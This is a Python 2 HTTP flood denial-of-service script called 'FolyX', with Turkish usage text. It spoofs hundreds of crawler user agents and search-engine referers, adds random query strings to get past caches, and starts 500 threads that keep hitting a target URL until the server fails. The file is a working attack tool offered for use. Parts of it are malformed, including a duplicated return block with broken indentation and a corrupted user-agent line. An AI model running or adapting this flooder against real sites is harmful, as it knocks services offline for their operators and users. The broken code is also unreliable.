import urllib2
import sys
import threading
import random
import re

#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
        headers_useragents.append('(DreamPassport/3.0; isao/MyDiGiRabi)')
	headers_useragents.append('(Privoxy/1.0)')
	headers_useragents.append('*/Nutch-0.9-dev')
	headers_useragents.append('+SitiDi.net/SitiDiBot/1.0 (+Have Good Day)')
	headers_useragents.append('-DIE-KRAEHE- META-SEARCH-ENGINE/1.1 http://www.die-kraehe.de')
	headers_useragents.append('123spider-Bot (Version: 1.02) powered by www.123spider.de')
	headers_useragents.append('192.comAgent')
	headers_useragents.append('1st ZipCommander (Net) - http://www.zipcommander.com/')
	headers_useragents.append('2Bone_LinkChecker/1.0 libwww-perl/5.64')
	headers_useragents.append('4anything.com LinkChecker v2.0')
	headers_useragents.append('8484 Boston Project v 1.0')
	headers_useragents.append(':robot/1.0 (linux) ( admin e-mail: undefined http://www.neofonie.de/loesungen/search/robot.html )')
	headers_useragents.append('A-Online Search')
	headers_useragents.append('A1 Keyword Research/1.0.2 (+http://www.micro-sys.dk/products/keyword-research/) miggibot/2007.03.27')
	headers_useragents.append('A1 Sitemap Generator/1.0 (+http://www.micro-sys.dk/products/sitemap-generator/) miggibot/2006.01.24')
	headers_useragents.append('AbachoBOT')
	headers_useragents.append('AbachoBOT (Mozilla compatible)')
	headers_useragents.append('ABCdatos BotLink/5.xx.xxx#BBL')
	headers_useragents.append('Aberja Checkomat 	Aberja Hybridsuchmaschine (Germany)')
	headers_useragents.append('abot/0.1 (abot; http://www.abot.com; abot@abot.com)')
	headers_useragents.append('About/0.1libwww-perl/5.47')
	headers_useragents.append('Accelatech RSSCrawler/0.4')
	headers_useragents.append('accoona 	Accoona Search robot')
	headers_useragents.append('Accoona-AI-Agent/1.1.1 (crawler at accoona dot com)')
	headers_useragents.append('Accoona-AI-Agent/1.1.2 (aicrawler at accoonabot dot com)')
	headers_useragents.append('Ace Explorer')
	headers_useragents.append('Ack (http://www.ackerm.com/)')
	headers_useragents.append('AcoiRobot')
	headers_useragents.append('Acoon Robot v1.50.001')
	headers_useragents.append('Acoon Robot v1.52 (http://www.acoon.de)')
	headers_useragents.append('Acoon-Robot 4.0.x.[xx] (http://www.acoon.de)')
	headers_useragents.append('Acoon-Robot v3.xx (http://www.acoon.de and http://www.acoon.com)')
	headers_useragents.append('Acorn/Nutch-0.9 (Non-Profit Search Engine; acorn.isara.org; acorn at isara dot org)')
	headers_useragents.append('ActiveBookmark 1.x')
	headers_useragents.append('Activeworlds')
	headers_useragents.append('ActiveWorlds/3.xx (xxx)')
	headers_useragents.append('AnnoMille spider 0.1 alpha - http://www.annomille.it')
	headers_useragents.append('annotate_google; http://ponderer.org/download/annotate_google.user.js')
	headers_useragents.append('Anonymized by ProxyOS: http://www.megaproxy.com')
	headers_useragents.append('Anonymizer/1.1')
	headers_useragents.append('AnswerBus (http://www.answerbus.com/)')
	headers_useragents.append('AnswerChase PROve x.0')
	headers_useragents.append('AnswerChase x.0')
	headers_useragents.append('ANTFresco/x.xx')
	headers_useragents.append('antibot-V1.1.5/i586-linux-2.2')
	headers_useragents.append('AnzwersCrawl/2.0 (anzwerscrawl@anzwers.com.au;Engine)')
	headers_useragents.append('Apexoo Spider 1.x')
	headers_useragents.append('Aplix HTTP/1.0.1')
	headers_useragents.append('Aplix_SANYO_browser/1.x (Japanese)')
	headers_useragents.append('Aplix_SEGASATURN_browser/1.x (Japanese)')
	headers_useragents.append('Aport')
	headers_useragents.append('appie 1.1 (www.walhello.com)')
	headers_useragents.append('Apple iPhone v1.1.4 CoreMedia v1.0.0.4A102')
	headers_useragents.append('Apple-PubSub/65.1.1')
	headers_useragents.append('ArabyBot (compatible; Mozilla/5.0; GoogleBot; FAST Crawler 6.4; http://www.araby.com;)')
	headers_useragents.append('ArachBot')
	headers_useragents.append('Arachnoidea (arachnoidea@euroseek.com)')
	headers_useragents.append('aranhabot')
	headers_useragents.append('ArchitextSpider')
	headers_useragents.append('archive.org_bot')
	headers_useragents.append('Argus/1.1 (Nutch; http://www.simpy.com/bot.html; feedback at simpy dot com)')
	headers_useragents.append('Arikus_Spider')
	headers_useragents.append('Arquivo-web-crawler (compatible; heritrix/1.12.1 +http://arquivo-web.fccn.pt)')
        headers_useragents.append('asked/Nutch-0.8 (web crawler; http://asked.jp; epicurus at gmail dot com)')
	headers_useragents.append('ASPSeek/1.2.5')
	headers_useragents.append('ASPseek/1.2.9d')
	headers_useragents.append('ASPSeek/1.2.x')
	headers_useragents.append('ASPSeek/1.2.xa')
	headers_useragents.append('ASPseek/1.2.xx')
	headers_useragents.append('ASPSeek/1.2.xxpre')
	headers_useragents.append('ASSORT/0.10')
	headers_useragents.append('asterias/2.0')
	headers_useragents.append('AtlocalBot/1.1 +(http://www.atlocal.com/local-web-site-owner.html)')
	headers_useragents.append('Atomic_Email_Hunter/4.0')
	headers_useragents.append('Atomz/1.0')
	headers_useragents.append('atSpider/1.0')
	headers_useragents.append('Digger/1.0 JDK/1.3.0rc3')
	headers_useragents.append('DigOut4U')
	headers_useragents.append('DIIbot/1.2')
	headers_useragents.append('Dillo/0.8.5-i18n-misc')
	headers_useragents.append('Dillo/0.x.x')
	headers_useragents.append('disastrous/1.0.5 (running with Python 2.5.1; http://www.bortzmeyer.org/disastrous.html; archangel77@del.icio.us)')
	headers_useragents.append('DISCo Pump x.x')
	headers_useragents.append('disco/Nutch-0.9 (experimental crawler; www.discoveryengine.com; disco-crawl@discoveryengine.com)')
	headers_useragents.append('disco/Nutch-1.0-dev (experimental crawler; www.discoveryengine.com; disco-crawl@discoveryengine.com)')
	headers_useragents.append('DittoSpyder')
	headers_useragents.append('dloader(NaverRobot)/1.0')
	headers_useragents.append('DNSRight.com WebBot Link Ckeck Tool. Report abuse to: dnsr@dnsright.com')
	headers_useragents.append('DoCoMo/1.0/Nxxxi/c10')
	headers_useragents.append('DoCoMo/1.0/Nxxxi/c10/TB')
	headers_useragents.append('DoCoMo/1.0/P502i/c10 (Google CHTML Proxy/1.0)')
	headers_useragents.append('DoCoMo/2.0 P900iV(c100;TB;W24H11)')
	headers_useragents.append('DoCoMo/2.0 SH901iS(c100;TB;W24H12))gzip(gfe) (via translate.google.com)')
	headers_useragents.append('DoCoMo/2.0 SH902i (compatible; Y!J-SRD/1.0; http://help.yahoo.co.jp/help/jp/search/indexing/indexing-27.html)')
	headers_useragents.append('DoCoMo/2.0/SO502i (compatible; Y!J-SRD/1.0; http://help.yahoo.co.jp/help/jp/search/indexing/indexing-27.html)')
	headers_useragents.append('DocZilla/1.0 (Windows; U; WinNT4.0; en-US; rv:1.0.0) Gecko/20020804')
	headers_useragents.append('dodgebot/experimental')
	headers_useragents.append('DonutP; Windows98SE')
	headers_useragents.append('Doubanbot/1.0 (bot@douban.com http://www.douban.com)')
	headers_useragents.append('Download Demon/3.x.x.x')
	headers_useragents.append('Download Druid 2.x')
	headers_useragents.append('Download Express 1.0')
	headers_useragents.append('Download Master')
	headers_useragents.append('Download Ninja 3.0')
	headers_useragents.append('Download Wonder')
	headers_useragents.append('Download-Tipp Linkcheck (http://download-tipp.de/)')
	headers_useragents.append('Download.exe(1.1) (+http://www.sql-und-xml.de/freeware-tools/)')
	headers_useragents.append('DownloadDirect.1.0')
	headers_useragents.append('Dr.Web (R) online scanner: http://online.drweb.com/')
	headers_useragents.append('Dragonfly File Reader')
	headers_useragents.append('Drecombot/1.0 (http://career.drecom.jp/bot.html)')
	headers_useragents.append('Drupal (+http://drupal.org/)')
	headers_useragents.append('DSurf15a 01')
	headers_useragents.append('DSurf15a 71')
	headers_useragents.append('DSurf15a 81')
	headers_useragents.append('DSurf15a VA')
	headers_useragents.append('DTAAgent')
	headers_useragents.append('dtSearchSpider')
	headers_useragents.append('Dual Proxy')
	headers_useragents.append('DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)')
	headers_useragents.append('Dumbot(version 0.1 beta - dumbfind.com)')
	headers_useragents.append('Dumbot(version 0.1 beta - http://www.dumbfind.com/dumbot.html)')
	headers_useragents.append('Dumbot(version 0.1 beta)')
	headers_useragents.append('e-sense 1.0 ea(www.vigiltech.com/esensedisclaim.html)')
	headers_useragents.append('e-SocietyRobot(http://www.yama.info.waseda.ac.jp/~yamana/es/)')
	headers_useragents.append('eApolloBot/2.0 (compatible; heritrix/2.0.0-SNAPSHOT-20071024.170148 +http://www.eapollo-opto.com)')
	headers_useragents.append('EARTHCOM.info/1.x [www.earthcom.info]')
	headers_useragents.append('EARTHCOM.info/1.xbeta [www.earthcom.info]')
	headers_useragents.append('EasyDL/3.xx')
	headers_useragents.append('EasyDL/3.xx http://keywen.com/Encyclopedia/Bot')
	headers_useragents.append('EBrowse 1.4b')
	headers_useragents.append('eCatch/3.0')
	headers_useragents.append('EchO!/2.0')
	headers_useragents.append('Educate Search VxB')
	headers_useragents.append('egothor/3.0a (+http://www.xdefine.org/robot.html)')
	headers_useragents.append('EgotoBot/4.8 (+http://www.egoto.com/about.htm)')
	headers_useragents.append('ejupiter.com')
	headers_useragents.append('EldoS TimelyWeb/3.x')
	headers_useragents.append('elfbot/1.0 (+http://www.uchoose.de/crawler/elfbot/)')
	headers_useragents.append('ELI/20070402:2.0 (DAUM RSS Robot) Daum Communications Corp.; +http://ws.daum.net/aboutkr.html)')
	headers_useragents.append('ELinks (0.x.x; Linux 2.4.20 i586; 132x60)')
	headers_useragents.append('ELinks/0.x.x (textmode; NetBSD 1.6.2 sparc; 132x43)')
	headers_useragents.append('EmailSiphon')
	headers_useragents.append('EmailSpider')
	headers_useragents.append('EmailWolf 1.00')
	headers_useragents.append('EmeraldShield.com WebBot')
	headers_useragents.append('EmeraldShield.com WebBot (http://www.emeraldshield.com/webbot.aspx)')
	headers_useragents.append('EMPAS_ROBOT')
	headers_useragents.append('EnaBot/1.x (http://www.enaball.com/crawler.html)')
	headers_useragents.append('endo/1.0 (Mac OS X; ppc i386; http://kula.jp/endo)')
	headers_useragents.append('Enfish Tracker')
	headers_useragents.append('Enterprise_Search/1.0')
	headers_useragents.append('Enterprise_Search/1.0.xxx')
	headers_useragents.append('Enterprise_Search/1.00.xxx;MSSQL (http://www.innerprise.net/es-spider.asp)')
	headers_useragents.append('envolk/1.7 (+http://www.envolk.com/envolkspiderinfo.php)')
	headers_useragents.append('envolk[ITS]spider/1.6(+http://www.envolk.com/envolkspider.html)')
	headers_useragents.append('EroCrawler')
	headers_useragents.append('ES.NET_Crawler/2.0 (http://search.innerprise.net/)')
	headers_useragents.append('eseek-larbin_2.6.2 (crawler@exactseek.com)')
	headers_useragents.append('ESISmartSpider')
	headers_useragents.append('eStyleSearch 4 (compatible; MSIE 6.0; Windows NT 5.0)')
	headers_useragents.append('Firefox (kastaneta03@hotmail.com)')
	headers_useragents.append('Firefox_1.0.6 (kasparek@naparek.cz)')
	headers_useragents.append('FirstGov.gov Search - POC:firstgov.webmasters@gsa.gov')
	headers_useragents.append('firstsbot')
	headers_useragents.append('Flapbot/0.7.2 (Flaptor Crawler; http://www.flaptor.com; crawler at flaptor period com)')
	headers_useragents.append('FlashGet')
	headers_useragents.append('FLATARTS_FAVICO')
	headers_useragents.append('Flexum spider')
	headers_useragents.append('Flexum/2.0')
	headers_useragents.append('FlickBot 2.0 RPT-HTTPClient/0.3-3')
	headers_useragents.append('flunky')
	headers_useragents.append('fly/6.01 libwww/4.0D')
	headers_useragents.append('flyindex.net 1.0/http://www.flyindex.net')
	headers_useragents.append('FnooleBot/2.5.2 (+http://www.fnoole.com/addurl.html)')
	headers_useragents.append('FocusedSampler/1.0')
	headers_useragents.append('Folkd.com Spider/0.1 beta 1 (www.folkd.com)')
	headers_useragents.append('FollowSite Bot ( http://www.followsite.com/bot.html )')
	headers_useragents.append('FollowSite.com ( http://www.followsite.com/b.html )')
	headers_useragents.append('Fooky.com/ScorpionBot/ScoutOut; http://www.fooky.com/scorpionbots')
	headers_useragents.append('Francis/1.0 (francis@neomo.de http://www.neomo.de/)')
	headers_useragents.append('Franklin Locator 1.8')
	headers_useragents.append('free-downloads.net download-link validator /0.1')
	headers_useragents.append('FreeFind.com-SiteSearchEngine/1.0 (http://freefind.com; spiderinfo@freefind.com)')
	headers_useragents.append('Frelicbot/1.0 +http://www.frelic.com/')
	headers_useragents.append('FreshDownload/x.xx')
	headers_useragents.append('FreshNotes crawler< report problems to crawler-at-freshnotes-dot-com')
	headers_useragents.append('FSurf15a 01')
	headers_useragents.append('FTB-Bot http://www.findthebest.co.uk/')
	headers_useragents.append('Full Web Bot 0416B')
	headers_useragents.append('Full Web Bot 0516B')
	headers_useragents.append('Full Web Bot 2816B')
	headers_useragents.append('FuseBulb.Com')
	headers_useragents.append('FyberSpider (+http://www.fybersearch.com/fyberspider.php)')
	headers_useragents.append('unknownght.com Web Server IIS vs Apache Survey. See Results at www.DNSRight.com	headers_useragents.append(')
	headers_useragents.append('factbot : http://www.factbites.com/robots')
	headers_useragents.append('FaEdit/2.0.x')
	headers_useragents.append('FairAd Client')
	headers_useragents.append('FANGCrawl/0.01')
	headers_useragents.append('FARK.com link verifier')
	headers_useragents.append('Fast Crawler Gold Edition')
	headers_useragents.append('FAST Enterprise Crawler 6 (Experimental)')
	headers_useragents.append('FAST Enterprise Crawler 6 / Scirus scirus-crawler@fast.no; http://www.scirus.com/srsapp/contactus/')
	headers_useragents.append('FAST Enterprise Crawler 6 used by Cobra Development (admin@fastsearch.com)')
	headers_useragents.append('FAST Enterprise Crawler 6 used by Comperio AS (sts@comperio.no)')
	headers_useragents.append('FAST Enterprise Crawler 6 used by FAST (FAST)')
	headers_useragents.append('FAST Enterprise Crawler 6 used by Pages Jaunes (pvincent@pagesjaunes.fr)')
	headers_useragents.append('FAST Enterprise Crawler 6 used by Sensis.com.au Web Crawler (search_comments\at\sensis\dot\com\dot\au)')
	headers_useragents.append('FAST Enterprise Crawler 6 used by Singapore Press Holdings (crawler@sphsearch.sg)')
	headers_useragents.append('FAST Enterprise Crawler 6 used by WWU (wardi@uni-muenster.de)')
	headers_useragents.append('FAST Enterprise Crawler/6 (www.fastsearch.com)')
	return(headers_useragents)

# generates a referer array

        return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('www.ask.com/?q=')
        headers_referers.append('www.bing.com/?q=')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	print '---------------------------------------------------'
	print 'Kullanim:'
        print '#Windows: FolyX.py http://www.siteurl.com/'
        print '#Linux: python FolyX.py http://www.siteurl.com/'
	print "\a"
print \
"""                                                                                                                                          

 /$$$$$$$$        /$$                    
| $$_____/       | $$                    
| $$     /$$$$$$ | $$ /$$   /$$ /$$   /$$
| $$$$$ /$$__  $$| $$| $$  | $$|  $$ /$$/
| $$__/| $$  \ $$| $$| $$  | $$ \  $$$$/ 
| $$   | $$  | $$| $$| $$  | $$  >$$  $$ 
| $$   |  $$$$$$/| $$|  $$$$$$$ /$$/\  $$
|__/    \______/ |__/ \____  $$|__/  \__/
                      /$$  | $$          
                     |  $$$$$$/          
                      \______/           

"""
print '---------------------------------------------------'

	
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
 			print 'Bots Is Connect packets upload'
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Shots sends Senting" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n -FolyX Hits are secced"

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print "#THT Folyx"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		host = m.group(1)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
